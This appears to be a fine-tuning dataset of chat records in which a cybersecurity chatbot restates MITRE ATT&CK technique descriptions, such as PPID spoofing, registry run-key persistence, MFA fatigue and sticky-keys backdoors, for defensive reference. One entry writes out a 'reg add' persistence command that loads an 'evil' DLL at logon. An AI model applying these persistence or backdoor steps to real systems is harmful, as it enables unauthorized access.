{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Input Prompt' and with the Id: T1141 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Input Prompt' and with the Id: T1141 is described as follows: When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).. The systems targeted by this attack pattern are: macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Accounts' and with the Id: T1585.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Accounts' and with the Id: T1585.003 is described as follows: Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. . The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Deployment Tools' and with the Id: T1072 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Deployment Tools' and with the Id: T1072 is described as follows: Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.SaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over C2 Channel' and with the Id: T1041 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over C2 Channel' and with the Id: T1041 is described as follows: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Parent PID Spoofing' and with the Id: T1134.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Parent PID Spoofing' and with the Id: T1134.004 is described as follows: Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Gather Victim Org Information' and with the Id: T1591 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Gather Victim Org Information' and with the Id: T1591 is described as follows: Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Registry Run Keys / Startup Folder' and with the Id: T1060 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Registry Run Keys / Startup Folder' and with the Id: T1060 is described as follows: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.Placing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.The startup folder path for the current user is:* <code>C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>The startup folder path for all users is:* <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>The following run keys are created by default on Windows systems:* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)The following Registry keys can be used to set startup folder items for persistence:* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>The following Registry keys can control automatic startup of services during boot:* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Forge Web Credentials' and with the Id: T1606 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Forge Web Credentials' and with the Id: T1606 is described as follows: Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  . The systems targeted by this attack pattern are: SaaS, Windows, macOS, Linux, Azure AD, Office 365, Google Workspace, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multi-Factor Authentication Request Generation' and with the Id: T1621 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multi-Factor Authentication Request Generation' and with the Id: T1621 is described as follows: Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \u201cMFA fatigue.\u201d(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe). The systems targeted by this attack pattern are: Windows, Office 365, Linux, macOS, IaaS, SaaS, Azure AD, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Host Software Binary' and with the Id: T1554 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Host Software Binary' and with the Id: T1554 is described as follows: Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host.An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary\u2019s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Chat Messages' and with the Id: T1552.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Chat Messages' and with the Id: T1552.008 is described as follows: Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).. The systems targeted by this attack pattern are: Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'PowerShell' and with the Id: T1059.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'PowerShell' and with the Id: T1059.001 is described as follows: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Shortcut Modification' and with the Id: T1023 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Shortcut Modification' and with the Id: T1023 is described as follows: Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Change Default File Association' and with the Id: T1546.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Change Default File Association' and with the Id: T1546.001 is described as follows: Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: * <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'VDSO Hijacking' and with the Id: T1055.014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'VDSO Hijacking' and with the Id: T1055.014 is described as follows: Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  . The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multiband Communication' and with the Id: T1026 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multiband Communication' and with the Id: T1026 is described as follows: **This technique has been deprecated and should no longer be used.**Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File Transfer Protocols' and with the Id: T1071.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File Transfer Protocols' and with the Id: T1071.002 is described as follows: Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Component Object Model Hijacking' and with the Id: T1122 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Component Object Model Hijacking' and with the Id: T1122 is described as follows: The Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Accessibility Features' and with the Id: T1015 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Accessibility Features' and with the Id: T1015 is described as follows: Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for the accessibility program (e.g., \"utilman.exe\"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Credential Access' and with the Id: T1212 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Credential Access' and with the Id: T1212 is described as follows: Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.. The systems targeted by this attack pattern are: Linux, Windows, macOS, Azure AD ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Emond' and with the Id: T1546.014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Emond' and with the Id: T1546.014 is described as follows: Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.. The systems targeted by this attack pattern are: macOS ."}]}
